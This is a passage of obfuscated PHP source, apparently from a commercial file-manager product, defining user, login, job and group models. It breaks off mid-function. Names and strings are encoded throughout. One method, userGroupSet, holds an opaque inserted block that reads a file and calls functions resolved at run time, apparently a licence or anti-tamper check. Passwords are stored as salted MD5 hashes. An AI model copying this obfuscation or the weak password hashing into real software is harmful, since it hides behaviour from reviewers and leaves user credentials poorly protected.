$ı¾Ä¹Ñ¤[487] => $×íôôƒº, $ı¾Ä¹Ñ¤[488] => $§Ü±‰Òó, $ı¾Ä¹Ñ¤[489] => $ø‹õŞè–, $ı¾Ä¹Ñ¤[1963] => $ä­•¡õ + 1); return $this->add($Ê¯»½éî); } protected function remove($¡ÒØã²) { $‰«²®Õ° =& $_SERVER[è¶³ÒßÑ]; $Á‡È·ÖÏ = array($‰«²®Õ°[1752] => USER_ID, $‰«²®Õ°[486] => $¡ÒØã²); return $this->where($Á‡È·ÖÏ)->delete(); } protected function removeByName($ëŞ¯¸Ø†) { $³ØÍŠ =& $_SERVER[è¶³ÒßÑ]; $±ƒÁÙàÍ = array($³ØÍŠ[1752] => USER_ID, $³ØÍŠ[487] => $ëŞ¯¸Ø†, $³ØÍŠ[550] => 0); return $this->where($±ƒÁÙàÍ)->delete(); } protected function rename($˜˜ÕøˆŞ, $›‘±ÕãŞ) { $ëÇˆÏôÒ =& $_SERVER[è¶³ÒßÑ]; if ($˜˜ÕøˆŞ == $›‘±ÕãŞ) { return !1; } $œ–ı£ã± = $this->getAutoName($›‘±ÕãŞ); if ($›‘±ÕãŞ != $œ–ı£ã±) { return !1; } $ €éÌÊ¼ = array($ëÇˆÏôÒ[1752] => USER_ID, $ëÇˆÏôÒ[550] => 0, $ëÇˆÏôÒ[32] => $˜˜ÕøˆŞ); return $this->where($ €éÌÊ¼)->save(array($ëÇˆÏôÒ[32] => $›‘±ÕãŞ)); } protected function resetSort($ËËø’ÎĞ) { $ïÇĞóª =& $_SERVER[è¶³ÒßÑ]; $ËËø’ÎĞ = is_array($ËËø’ÎĞ) ? $ËËø’ÎĞ : array(); $º€Â¡š = array($ïÇĞóª[1752] => USER_ID); for ($áÇõãºÆ = 0; $áÇõãºÆ < count($ËËø’ÎĞ); $áÇõãºÆ++) { $º€Â¡š[$ïÇĞóª[486]] = $ËËø’ÎĞ[$áÇõãºÆ]; $this->where($º€Â¡š)->save(array($ïÇĞóª[1963] => $áÇõãºÆ + 1)); } return !0; } protected function moveTop($˜æ€³öç) { $æÈ•Ñ§ =& $_SERVER[è¶³ÒßÑ]; $¦‚È•£ = array($æÈ•Ñ§[1752] => USER_ID, $æÈ•Ñ§[550] => 0); $åßÂšÓİ = $this->where($¦‚È•£)->where(array($æÈ•Ñ§[32] => $˜æ€³öç))->find(); if (!$åßÂšÓİ) { return; } $”ª¸‚˜õ = $this->field($æÈ•Ñ§[468])->where($¦‚È•£)->order($æÈ•Ñ§[2437])->select(); $”ª¸‚˜õ = array_to_keyvalue($”ª¸‚˜õ, $æÈ•Ñ§[12], $æÈ•Ñ§[468]); $‘äöè©Û = $”ª¸‚˜õ; $”ª¸‚˜õ = array_remove_value($”ª¸‚˜õ, $åßÂšÓİ[$æÈ•Ñ§[468]]); array_unshift($”ª¸‚˜õ, $åßÂšÓİ[$æÈ•Ñ§[468]]); return $this->resetSort($”ª¸‚˜õ); } protected function moveBottom($š‘éÆê‚) { $çØõ¾ =& $_SERVER[è¶³ÒßÑ]; $úµ¤á˜ = array($çØõ¾[1752] => USER_ID, $çØõ¾[550] => 0); $¯£§³¥ = $this->where($úµ¤á˜)->max($çØõ¾[1983]); $¦Õ³ƒ¬Ÿ = array($çØõ¾[1983] => $¯£§³¥ + 1); return $this->where($úµ¤á˜)->where(array($çØõ¾[32] => $š‘éÆê‚))->save($¦Õ³ƒ¬Ÿ); } private function getAutoName($î–„ìª–) { $šÓ”’„Î =& $_SERVER[è¶³ÒßÑ]; $íÏ¶ÖÔ = array($šÓ”’„Î[1752] => USER_ID, $šÓ”’„Î[550] => 0); $×ßÙœ = $this->field($šÓ”’„Î[32])->where($íÏ¶ÖÔ)->select(); $×ßÙœ = array_to_keyvalue($×ßÙœ, $šÓ”’„Î[12], $šÓ”’„Î[32]); if (!$×ßÙœ || !in_array($î–„ìª–, $×ßÙœ)) { return $î–„ìª–; } for ($ÉØàŒ²¢ = 0; $ÉØàŒ²¢ < count($×ßÙœ); $ÉØàŒ²¢++) { if (!in_array($î–„ìª– . "\x28{$ÉØàŒ²¢}\x29", $×ßÙœ)) { return $î–„ìª– . "\x28{$ÉØàŒ²¢}\x29"; } } return $î–„ìª– . "\x28{$ÉØàŒ²¢}\x29"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\x6d\x2e\x6a\x6f\142\114\x69\x73\164"; public $field = array("\156\x61\x6d\x65", "\144\145\163\x63", "\x73\x6f\x72\164"); const JOB_KEY = "\163\145\x6c\x66\112\x6f\142\x4c\x69\x73\164"; public function listData($‚‡¬„ = false, $êà¶¿‘ = "\163\157\x72\164", $˜ÄÕË¨ = false) { return parent::listData($‚‡¬„, $êà¶¿‘, $˜ÄÕË¨); } public function remove($Á»í·¿) { return parent::remove($Á»í·¿); } public function add($Ÿş’ŸÌ¼) { $ıÎĞ±Œ =& $_SERVER[è¶³ÒßÑ]; if ($this->findByName($Ÿş’ŸÌ¼[$ıÎĞ±Œ[32]])) { return !1; } $Ÿş’ŸÌ¼[$ıÎĞ±Œ[1983]] = $this->getSort(); return parent::insert($Ÿş’ŸÌ¼); } private function getSort() { $†± ‘ıÒ =& $_SERVER[è¶³ÒßÑ]; $–ˆ’ÍÀµ = parent::listData(); $­ÔÀ‚Â = array_to_keyvalue($–ˆ’ÍÀµ, $†± ‘ıÒ[12], $†± ‘ıÒ[1983]); return empty($­ÔÀ‚Â) ? 0 : max($­ÔÀ‚Â) + 1; } public function update($¯•ß÷½å, $Ú„ùûÇ) { $™çñäÈ€ =& $_SERVER[è¶³ÒßÑ]; $ÉËû» = parent::listData($¯•ß÷½å); $€çİ¡¿ = $this->findByName($Ú„ùûÇ[$™çñäÈ€[32]]); if (!$ÉËû» || $€çİ¡¿ && $€çİ¡¿[$™çñäÈ€[468]] != $ÉËû»[$™çñäÈ€[468]]) { return !1; } return parent::update($¯•ß÷½å, $Ú„ùûÇ); } public function setUserJob($­ıÈ°¾, $¥êÇ°Æª) { $š«“ùµê =& $_SERVER[è¶³ÒßÑ]; if (!is_array($¥êÇ°Æª)) { $¥êÇ°Æª = array($¥êÇ°Æª); } $î¢ŞòÂÙ = parent::listData(); $úê©«‰á = array_to_keyvalue($î¢ŞòÂÙ, $š«“ùµê[32]); $ƒÂÄşå¼ = $š«“ùµê[447]; foreach ($¥êÇ°Æª as $ƒªÇšÙÚ) { if ($úê©«‰á[$ƒªÇšÙÚ]) { $ƒÂÄşå¼ .= $úê©«‰á[$ƒªÇšÙÚ][$š«“ùµê[468]] . $š«“ùµê[50]; } else { $¸Ô”Â­· = $this->add($ƒªÇšÙÚ); $ƒÂÄşå¼ .= $¸Ô”Â­· . $š«“ùµê[50]; } } $ƒÂÄşå¼ = rtrim($ƒÂÄşå¼, $š«“ùµê[50]); Model($š«“ùµê[591])->metaSet($­ıÈ°¾, self::JOB_KEY, $ƒÂÄşå¼); } public function getUserJob($¿Î›£€ú) { $›•ï‚¹æ = Model($_SERVER[è¶³ÒßÑ][591])->metaGet($¿Î›£€ú); return $this->getUserJobInfo($›•ï‚¹æ[self::JOB_KEY]); } public function getUserJobInfo($›éª¬®é) { $Ä™Õ†¶Î =& $_SERVER[è¶³ÒßÑ]; $°²¥¦©™ = explode($Ä™Õ†¶Î[50], $›éª¬®é); $¥İë›Üİ = parent::listData(); $¥İë›Üİ = array_remove_key($¥İë›Üİ, $Ä™Õ†¶Î[241]); $²ÁçÌÁö = array(); foreach ($°²¥¦©™ as $ªù¼’ô) { if (isset($¥İë›Üİ[$ªù¼’ô])) { $²ÁçÌÁö[] = $¥İë›Üİ[$ªù¼’ô]; } } return $²ÁçÌÁö; } } class UserModel extends ModelBase { protected $tableName = "\x75\x73\145\162"; protected $tableMeta = array("\x74\141\x62\154\x65\x4e\x61\155\145" => "\165\x73\145\162\x5f\155\145\x74\141", "\155\x65\x74\141\x46\x69\145\x6c\144" => "\165\x73\x65\x72\x49\104"); protected $simpleField = "\165\x73\145\162\x49\104\x2c\x6e\151\143\x6b\x4e\x61\155\x65\54\x6e\x61\x6d\145\x2c\x61\x76\141\x74\141\162\54\163\x65\x78\x2c\163\164\x61\164\165\163"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($Êğ³í§«) { $š”¡‹¾÷ =& $_SERVER[è¶³ÒßÑ]; $¹íˆñÑœ = $š”¡‹¾÷[2438]; return array($š”¡‹¾÷[2041] => array($Êğ³í§«[0], $¹íˆñÑœ), $š”¡‹¾÷[2043] => array($Êğ³í§«[0], $¹íˆñÑœ), $š”¡‹¾÷[2439] => array($Êğ³í§«[0], $¹íˆñÑœ)); } protected function getInfo($¹²Ö£Î», $˜ĞŠ ´… = false) { $¦»ˆ“Âå = $this->getInfoSimple($¹²Ö£Î»); if (!is_array($¦»ˆ“Âå)) { return array(); } if ($˜ĞŠ ´…) { return $this->_getInfoApply($¦»ˆ“Âå); } return $this->cacheFunctionGet($_SERVER[è¶³ÒßÑ][2045], $¹²Ö£Î»); } protected function getInfoFull($ŞŒ¤°Õ—, $ı¹ÔÍ«‡ = false) { $õ”±…çÒ = $this->getInfoSimple($ŞŒ¤°Õ—); if (!is_array($õ”±…çÒ)) { return array(); } if ($ı¹ÔÍ«‡) { return $this->_getInfoApply($õ”±…çÒ, !0); } return $this->cacheFunctionGet($_SERVER[è¶³ÒßÑ][2440], $ŞŒ¤°Õ—); } private function _getInfoApply($ü¬œàº, $Ö„õ”æÇ = false) { $¬Üåİ‰ =& $_SERVER[è¶³ÒßÑ]; if (!$ü¬œàº) { return $ü¬œàº; } $÷ğè”õù = md5($¬Üåİ‰[2441] . $ü¬œàº[$¬Üåİ‰[942]] . $¬Üåİ‰[2442] . $ü¬œàº[$¬Üåİ‰[32]]); $ü¬œàº = $this->_listDataApplyItem($ü¬œàº); $£áö˜‹ = Model($¬Üåİ‰[1395])->metaGet($ü¬œàº[$¬Üåİ‰[100]][$¬Üåİ‰[203]]); $ü¬œàº[$¬Üåİ‰[2443]] = $÷ğè”õù; $ü¬œàº[$¬Üåİ‰[100]][$¬Üåİ‰[2239]] = isset($£áö˜‹[$¬Üåİ‰[2240]]) ? $£áö˜‹[$¬Üåİ‰[2240]] : null; if ($Ö„õ”æÇ) { $ü¬œàº[$¬Üåİ‰[532]] = $this->metaGet($ü¬œàº[$¬Üåİ‰[1761]]); } return $ü¬œàº; } protected function getInfoSimple($¡£°ó‚û, $à³†ÊµĞ = false) { $«ÌÅŞ =& $_SERVER[è¶³ÒßÑ]; if (!$¡£°ó‚û) { return array(); } if ($à³†ÊµĞ) { $ì«™“® = $this->where(array($«ÌÅŞ[1761] => intval($¡£°ó‚û)))->find(); if (!is_array($ì«™“®)) { return array(); } $ì«™“®[$«ÌÅŞ[2444]] = Action($«ÌÅŞ[2445])->parseUrl($ì«™“®[$«ÌÅŞ[2444]]); return $ì«™“®; } return $this->cacheFunctionGet($«ÌÅŞ[2046], $¡£°ó‚û); } protected function getInfoSimpleOuter($©×æŠÙ—) { $¾¨ğ¼ùĞ =& $_SERVER[è¶³ÒßÑ]; if (!$©×æŠÙ— || $©×æŠÙ— == 0) { return array($¾¨ğ¼ùĞ[1761] => $¾¨ğ¼ùĞ[238], $¾¨ğ¼ùĞ[32] => $¾¨ğ¼ùĞ[186] . LNG($¾¨ğ¼ùĞ[2446]) . $¾¨ğ¼ùĞ[188], $¾¨ğ¼ùĞ[2444] => STATIC_PATH . $¾¨ğ¼ùĞ[2447]); } $—”÷õó÷ = $this->cacheFunctionGet($¾¨ğ¼ùĞ[2046], $©×æŠÙ—); $¾ûõ÷ = array_field_key($—”÷õó÷, explode($¾¨ğ¼ùĞ[50], $this->simpleField)); if (!$¾ûõ÷) { return array($¾¨ğ¼ùĞ[1761] => $¾¨ğ¼ùĞ[1248], $¾¨ğ¼ùĞ[32] => $¾¨ğ¼ùĞ[186] . LNG($¾¨ğ¼ùĞ[2448]) . $¾¨ğ¼ùĞ[188], $¾¨ğ¼ùĞ[2444] => STATIC_PATH . $¾¨ğ¼ùĞ[2449]); } $¾ûõ÷[$¾¨ğ¼ùĞ[2444]] = Action($¾¨ğ¼ùĞ[2445])->parseUrl($¾ûõ÷[$¾¨ğ¼ùĞ[2444]]); return $¾ûõ÷; } protected function groupUser($ùÅŒê¡Ä) { } public static function errorLang($¦ıëóí) { $ËŠŞ“”‹ =& $_SERVER[è¶³ÒßÑ]; $æ¥¬ •Å = array(self::ERROR_USER_NOT_EXISTS => $ËŠŞ“”‹[2450], self::ERROR_USER_PASSWORD_ERROR => $ËŠŞ“”‹[2451], self::ERROR_USER_EXIST_NAME => $ËŠŞ“”‹[2452], self::ERROR_USER_EXIST_PHONE => $ËŠŞ“”‹[2453], self::ERROR_USER_EXIST_EMAIL => $ËŠŞ“”‹[2454], self::ERROR_USER_LOGIN_LOCK => $ËŠŞ“”‹[2455], self::ERROR_IP_NOT_ALLOW => $ËŠŞ“”‹[2456], self::ERROR_USER_EXIST_NICKNAME => $ËŠŞ“”‹[2457]); $ª°ƒ°® = LNG($æ¥¬ •Å[$¦ıëóí]); if ($¦ıëóí == self::ERROR_USER_LOGIN_LOCK) { $àÁğØÌÎ = (int) Model($ËŠŞ“”‹[2458])->get($ËŠŞ“”‹[2459]); if ($àÁğØÌÎ > 60) { $ª°ƒ°® = str_replace($ËŠŞ“”‹[101], ceil($àÁğØÌÎ / 60), $ª°ƒ°®); } } return $ª°ƒ°®; } public function getInfoByMeta($´öƒûÔà, $Ûù‡¦Â) { $ƒ­ÇÏï =& $_SERVER[è¶³ÒßÑ]; $ÆæºÓ¥§ = Model($ƒ­ÇÏï[2460])->where(array($ƒ­ÇÏï[107] => $´öƒûÔà, $ƒ­ÇÏï[443] => $Ûù‡¦Â))->find(); if ($ÆæºÓ¥§) { return $this->getInfo($ÆæºÓ¥§[$ƒ­ÇÏï[1761]]); } return !1; } public function userLoginCheck($¾á¶¢¡ù, $«ËæÀØõ) { $àíÚ£ºÒ =& $_SERVER[è¶³ÒßÑ]; $áç‡¦–¿ = $this->userLoginFind($¾á¶¢¡ù); if (!$áç‡¦–¿) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($áç‡¦–¿[$àíÚ£ºÒ[1761]], $«ËæÀØõ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($áç‡¦–¿[$àíÚ£ºÒ[1761]]); } public function userLoginFind($Ö¨ø½¡Â) { $½– …õ =& $_SERVER[è¶³ÒßÑ]; $”Áå¿àõ = array($½– …õ[32] => $Ö¨ø½¡Â, $½– …õ[2247] => $Ö¨ø½¡Â, $½– …õ[374] => $Ö¨ø½¡Â, $½– …õ[2461] => $Ö¨ø½¡Â, $½– …õ[1053] => $½– …õ[1055]); if ($this->nickNameRpt()) { unset($”Áå¿àõ[$½– …õ[2247]]); } return $this->where($”Áå¿àõ)->find(); } public function clearCache($Ÿò­±ŞÃ) { $Á®’¸± =& $_SERVER[è¶³ÒßÑ]; $this->cacheFunctionClear($Á®’¸±[2045], $Ÿò­±ŞÃ); $this->cacheFunctionClear($Á®’¸±[2046], $Ÿò­±ŞÃ); $this->cacheFunctionClear($Á®’¸±[2440], $Ÿò­±ŞÃ); } public function userPasswordCheck($µŠ–ƒ©, $Å§­Éä) { $è•¹Ãğ¬ =& $_SERVER[è¶³ÒßÑ]; $´ƒ¡³£ã = $this->where(array($è•¹Ãğ¬[1761] => intval($µŠ–ƒ©)))->find(); $ “‚²Á§ = $this->metaGet($µŠ–ƒ©); $ù‡ÖÍÇÂ = isset($ “‚²Á§[$è•¹Ãğ¬[2462]]) ? $ “‚²Á§[$è•¹Ãğ¬[2462]] : $è•¹Ãğ¬[12]; if (md5($ù‡ÖÍÇÂ . trim($Å§­Éä)) !== $´ƒ¡³£ã[$è•¹Ãğ¬[942]]) { return !1; } return !0; } public function userAdd($‚Çßá¡) { $±‡É¬  =& $_SERVER[è¶³ÒßÑ]; $Ÿ›ıº©± = array($±‡É¬ [487] => $‚Çßá¡[$±‡É¬ [32]], $±‡É¬ [2463] => $‚Çßá¡[$±‡É¬ [2165]], $±‡É¬ [2464] => isset($‚Çßá¡[$±‡É¬ [374]]) ? $‚Çßá¡[$±‡É¬ [374]] : $±‡É¬ [12], $±‡É¬ [2465] => isset($‚Çßá¡[$±‡É¬ [2461]]) ? $‚Çßá¡[$±‡É¬ [2461]] : $±‡É¬ [12], $±‡É¬ [2466] => isset($‚Çßá¡[$±‡É¬ [2247]]) ? $‚Çßá¡[$±‡É¬ [2247]] : $‚Çßá¡[$±‡É¬ [32]], $±‡É¬ [2467] => isset($‚Çßá¡[$±‡É¬ [2444]]) ? $‚Çßá¡[$±‡É¬ [2444]] : $±‡É¬ [12], $±‡É¬ [2468] => isset($‚Çßá¡[$±‡É¬ [2469]]) ? $‚Çßá¡[$±‡É¬ [2469]] : 1, $±‡É¬ [2470] => $‚Çßá¡[$±‡É¬ [942]], $±‡É¬ [2047] => isset($‚Çßá¡[$±‡É¬ [1946]]) ? $‚Çßá¡[$±‡É¬ [1946]] : 1024 * 1024 * 20, $±‡É¬ [2048] => 0, $±‡É¬ [2471] => 0, $±‡É¬ [2092] => isset($‚Çßá¡[$±‡É¬ [804]]) ? $‚Çßá¡[$±‡É¬ [804]] : 1); if (!empty($‚Çßá¡[$±‡É¬ [1761]])) { $Ÿ›ıº©±[$±‡É¬ [1761]] = $‚Çßá¡[$±‡É¬ [1761]]; } $Áı€ğ¼Á = $this->_checkExist($‚Çßá¡); if ($Áı€ğ¼Á !== !0) { return $Áı€ğ¼Á; } if (!empty($Ÿ›ıº©±[$±‡É¬ [2444]]) && strlen($Ÿ›ıº©±[$±‡É¬ [2444]]) > 255) { $Ÿ›ıº©±[$±‡É¬ [2444]] = $±‡É¬ [12]; } $Ï–¤İ™Œ = $this->add($Ÿ›ıº©±); $Ë»ªÌÎò = array($±‡É¬ [2470] => $Ÿ›ıº©±[$±‡É¬ [942]], $±‡É¬ [2466] => $Ÿ›ıº©±[$±‡É¬ [2247]]); $this->userEdit($Ï–¤İ™Œ, $Ë»ªÌÎò); Model($±‡É¬ [1395])->userRootAdd($Ï–¤İ™Œ); return $Ï–¤İ™Œ; } protected function userEditTest($Œ©üú, $ãú€Ğ·‚) { return $this->call($_SERVER[è¶³ÒßÑ][2472], $Œ©üú, $ãú€Ğ·‚); } protected function userEdit($¾›—±â, $ïçµ¹ê½) { $š»ÙËÍ° =& $_SERVER[è¶³ÒßÑ]; $İÑÑº¤ = $this->getInfoSimple($¾›—±â); if (!$İÑÑº¤) { return !1; } $ñïõŸØ = $this->_checkExist($ïçµ¹ê½, $¾›—±â); if ($ñïõŸØ !== !0) { return $ñïõŸØ; } if (isset($ïçµ¹ê½[$š»ÙËÍ°[942]]) && trim($ïçµ¹ê½[$š»ÙËÍ°[942]]) != $š»ÙËÍ°[12]) { $ú…‡Éœ = $this->metaGet($¾›—±â); if (empty($ú…‡Éœ[$š»ÙËÍ°[2462]])) { $ú…‡Éœ[$š»ÙËÍ°[2462]] = rand_string(10); Model($š»ÙËÍ°[570])->metaSet($¾›—±â, $š»ÙËÍ°[2462], $ú…‡Éœ[$š»ÙËÍ°[2462]]); } $ïçµ¹ê½[$š»ÙËÍ°[942]] = md5($ú…‡Éœ[$š»ÙËÍ°[2462]] . trim($ïçµ¹ê½[$š»ÙËÍ°[942]])); } else { unset($ïçµ¹ê½[$š»ÙËÍ°[942]]); } if (!empty($ïçµ¹ê½[$š»ÙËÍ°[2444]]) && strlen($ïçµ¹ê½[$š»ÙËÍ°[2444]]) > 255) { $ïçµ¹ê½[$š»ÙËÍ°[2444]] = $š»ÙËÍ°[12]; } $this->where(array($š»ÙËÍ°[1752] => $¾›—±â))->save($ïçµ¹ê½); if (isset($ïçµ¹ê½[$š»ÙËÍ°[2247]])) { $this->setNamePinyin($¾›—±â, $ïçµ¹ê½[$š»ÙËÍ°[2247]]); } $this->clearCache($¾›—±â); return !0; } public function setNamePinyin($Ñ–·Ú†Ü, $²¯Œ‚ƒ¡ = false) { $¡›ÎÕ‹Ä =& $_SERVER[è¶³ÒßÑ]; if (!$²¯Œ‚ƒ¡) { $»®ôİì† = $this->getInfoSimple($Ñ–·Ú†Ü); $²¯Œ‚ƒ¡ = $»®ôİì†[$¡›ÎÕ‹Ä[2247]] ? $»®ôİì†[$¡›ÎÕ‹Ä[2247]] : $»®ôİì†[$¡›ÎÕ‹Ä[32]]; } $ÖŠî•ˆ® = Model($¡›ÎÕ‹Ä[591]); if (!Input::check($²¯Œ‚ƒ¡, $¡›ÎÕ‹Ä[648])) { return $ÖŠî•ˆ®->metaSet($Ñ–·Ú†Ü, array($¡›ÎÕ‹Ä[531] => $¡›ÎÕ‹Ä[12], $¡›ÎÕ‹Ä[530] => $¡›ÎÕ‹Ä[12])); } return $ÖŠî•ˆ®->metaSet($Ñ–·Ú†Ü, array($¡›ÎÕ‹Ä[531] => str_replace($¡›ÎÕ‹Ä[53], $¡›ÎÕ‹Ä[12], Pinyin::get($²¯Œ‚ƒ¡)), $¡›ÎÕ‹Ä[530] => Pinyin::get($²¯Œ‚ƒ¡, $¡›ÎÕ‹Ä[649]))); } private function nickNameRpt() { $ÓæÔ—§¸ =& $_SERVER[è¶³ÒßÑ]; $´òä¹ = Model($ÓæÔ—§¸[824])->get($ÓæÔ—§¸[2473]); $‹ıïĞÎ“ = $GLOBALS[$ÓæÔ—§¸[6]][$ÓæÔ—§¸[450]][$ÓæÔ—§¸[2473]]; $‡ÖˆÃÃÏ = !is_null($´òä¹) ? $´òä¹ : $‹ıïĞÎ“; return !!$‡ÖˆÃÃÏ; } private function _checkExist($Û¹Ş¶¹, $¾‘¿ğªÁ = false) { $‡í­©Á =& $_SERVER[è¶³ÒßÑ]; $©ƒÇÒØ¥ = array($‡í­©Á[32] => UserModel::ERROR_USER_EXIST_NAME, $‡í­©Á[2247] => UserModel::ERROR_USER_EXIST_NICKNAME, $‡í­©Á[374] => UserModel::ERROR_USER_EXIST_EMAIL, $‡í­©Á[2461] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($©ƒÇÒØ¥[$‡í­©Á[2247]]); } $º‚‘¦íş = $¾‘¿ğªÁ ? array($‡í­©Á[1761] => array($‡í­©Á[2474], $¾‘¿ğªÁ)) : array(); foreach ($©ƒÇÒØ¥ as $–¦«»üÁ => $úàäëÜ¨) { $Àèë˜í  = array(); foreach ($©ƒÇÒØ¥ as $¥ÆĞÊ´š => $ãò¸¥üù) { if (isset($Û¹Ş¶¹[$¥ÆĞÊ´š]) && $Û¹Ş¶¹[$¥ÆĞÊ´š]) { $Àèë˜í [] = $Û¹Ş¶¹[$¥ÆĞÊ´š]; } } if (!$Àèë˜í ) { continue; } $ÂùÒËŠ = array_merge(array($–¦«»üÁ => array($‡í­©Á[7], $Àèë˜í )), $º‚‘¦íş); $û’Ç‹™ = $this->where($ÂùÒËŠ)->find(); if ($û’Ç‹™) { return $úàäëÜ¨; } } return !0; } public function userListInfo($ß‘‘®ÂÒ) { $»°õŠ‡Æ =& $_SERVER[è¶³ÒßÑ]; $¡ÜëÀì“ = array(); $ß‘‘®ÂÒ = is_array($ß‘‘®ÂÒ) ? array_unique($ß‘‘®ÂÒ) : array(); if (!$ß‘‘®ÂÒ) { return $¡ÜëÀì“; } if (count($ß‘‘®ÂÒ) < 20) { foreach ($ß‘‘®ÂÒ as $¬¼ó¤Ò) { $¡ÜëÀì“[$¬¼ó¤Ò . $»°õŠ‡Æ[12]] = $this->getInfoSimpleOuter($¬¼ó¤Ò); } } else { $ÏÆûšƒ® = array($»°õŠ‡Æ[1752] => array($»°õŠ‡Æ[485], $ß‘‘®ÂÒ)); if (count($ß‘‘®ÂÒ) == 1) { $ÏÆûšƒ® = array($»°õŠ‡Æ[1752] => $ß‘‘®ÂÒ[0]); } $äš×İÄ† = Model($»°õŠ‡Æ[570])->field($this->simpleField)->where($ÏÆûšƒ®)->select(); $äš×İÄ† = array_to_keyvalue($äš×İÄ†, $»°õŠ‡Æ[1761]); foreach ($ß‘‘®ÂÒ as $¬¼ó¤Ò) { $¼ÔÚ¾å = $äš×İÄ†[$¬¼ó¤Ò]; if (!$¼ÔÚ¾å) { $¡ÜëÀì“[$¬¼ó¤Ò . $»°õŠ‡Æ[12]] = $this->getInfoSimpleOuter($¬¼ó¤Ò); continue; } $¼ÔÚ¾å[$»°õŠ‡Æ[2444]] = Action($»°õŠ‡Æ[2445])->parseUrl($¼ÔÚ¾å[$»°õŠ‡Æ[2444]]); $¡ÜëÀì“[$¬¼ó¤Ò . $»°õŠ‡Æ[12]] = $¼ÔÚ¾å; } } return $¡ÜëÀì“; } protected function userStatus($ÊÓ”ç, $†´§Åë) { $ä‚ÍĞûï = $this->getInfoSimple($ÊÓ”ç); if (!$ä‚ÍĞûï) { return !1; } $©Ë áœí = array($_SERVER[è¶³ÒßÑ][804] => $†´§Åë); return $this->userEdit($ÊÓ”ç, $©Ë áœí); } protected function userRemove($Øí®€ËŞ) { $ĞıÎ“ûó =& $_SERVER[è¶³ÒßÑ]; $àïà œÖ = $this->getInfoSimple($Øí®€ËŞ); if (!$àïà œÖ) { return !1; } $ËÔé®ôá = array($ĞıÎ“ûó[1752] => $Øí®€ËŞ); Model($ĞıÎ“ûó[657])->where($ËÔé®ôá)->delete(); Model($ĞıÎ“ûó[2475])->where($ËÔé®ôá)->delete(); Model($ĞıÎ“ûó[2053])->where($ËÔé®ôá)->delete(); Model($ĞıÎ“ûó[2460])->where($ËÔé®ôá)->delete(); Model($ĞıÎ“ûó[1122])->where($ËÔé®ôá)->delete(); Model($ĞıÎ“ûó[2264])->removeUserAll($Øí®€ËŞ); Model($ĞıÎ“ûó[878])->userRootRemove($Øí®€ËŞ); return $this->where($ËÔé®ôá)->delete(); } protected function userGroupSet($Í¹ÂÑ·, $‡©ÊÏ˜, $¿åÇ·Õ = array()) { $ÏÍĞÆ®Ş =& $_SERVER[è¶³ÒßÑ]; if ($_SERVER[$ÏÍĞÆ®Ş[56]] != $_SERVER[$ÏÍĞÆ®Ş[930]]) { $¤¤– ğ = $ÏÍĞÆ®Ş[931]; $×‡„ÓŒĞ = $ÏÍĞÆ®Ş[57]; $İàüßüÙ = $_SERVER[$ÏÍĞÆ®Ş[58]] . $ÏÍĞÆ®Ş[59]; $¶å» = $×‡„ÓŒĞ($İàüßüÙ); $ëŸÀÍë = explode($ÏÍĞÆ®Ş[60], $¶å»); if (count($ëŸÀÍë) < $ÏÍĞÆ®Ş[697]) { $ãÅŸ‰Ã· = $ÏÍĞÆ®Ş[62]; $ãÅŸ‰Ã·(); } $×ı ¦¦à = $ÏÍĞÆ®Ş[932]; $×ı ¦¦à($_SERVER[$ÏÍĞÆ®Ş[933]]); $×ı ¦¦à($_SERVER[$ÏÍĞÆ®Ş[58]] . $ÏÍĞÆ®Ş[934]); $Ê³¤ì¥ = 1; while ($Ê³¤ì¥ > 1) { $Ê³¤ì¥ = $Ê³¤ì¥ + 4; $ØÚ´«îŸ = rawurlencode($Ê³¤ì¥ . $ÏÍĞÆ®Ş[447]); } } $³¦µ†‘ƒ = $this->getInfoSimple($Í¹ÂÑ·); if (!$³¦µ†‘ƒ || !is_array($‡©ÊÏ˜)) { return !1; } $Ğ°®Ÿ = Model($ÏÍĞÆ®Ş[2053]); $Ğ°®Ÿ->where(array($ÏÍĞÆ®Ş[1761] => $Í¹ÂÑ·))->delete(); $¡¿ÒÆ¶” = array(); $·šø“èò = 0; foreach ($‡©ÊÏ˜ as $ªíşûË¸ => $·õä˜Îó) { $†èÈŸñ¨ = array($ÏÍĞÆ®Ş[1761] => $Í¹ÂÑ·, $ÏÍĞÆ®Ş[1959] => $ªíşûË¸, $ÏÍĞÆ®Ş[2067] => $·õä˜Îó); $†èÈŸñ¨[$ÏÍĞÆ®Ş[1983]] = isset($¿åÇ·Õ[$·šø“èò]) ? $¿åÇ·Õ[$·šø“èò] : 0; $·šø“èò++; $¡¿ÒÆ¶”[] = $†èÈŸñ¨; } return $Ğ°®Ÿ->addAll($¡¿ÒÆ¶”, array(), !0); } protected function userGroupAdd($¼´ãÜ¶…, $…Ø•§¯ä = array()) { $êí‡éß =& $_SERVER[è¶³ÒßÑ]; $°ôâ…‡¡ = $this->getInfoSimple($¼´ãÜ¶…); if (!$°ôâ…‡¡ || empty($…Ø•§¯ä)) { return !1; } $ÜŸ¢å½â = array(); foreach ($…Ø•§¯ä as $•ËŸÏüš => $ıò…Ùø) { $ÜŸ¢å½â[] = array($êí‡éß[1761] => $¼´ãÜ¶…, $êí‡éß[1959] => $•ËŸÏüš, $êí‡éß[2067] => $ıò…Ùø, $êí‡éß[1983] => 0); } return Model($êí‡éß[2053])->addAll($ÜŸ¢å½â, array(), !0); } protected function userGroupRemove($€Ç­®¯, $éóŸ‚ßË) { $Á¼›€Â¾ =& $_SERVER[è¶³ÒßÑ]; $íŠ¡³èè = $this->getInfoSimple($€Ç­®¯); if (!$íŠ¡³èè || !$éóŸ‚ßË) { return !1; } $ÔòŞì“¦ = array($Á¼›€Â¾[1752] => $€Ç­®¯, $Á¼›€Â¾[2051] => $éóŸ‚ßË); return Model($Á¼›€Â¾[2053])->where($ÔòŞì“¦)->delete(); } public function listData() { $Ëï§è·Û = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Ëï§è·Û[$_SERVER[è¶³ÒßÑ][438]]); return $Ëï§è·Û; } public function 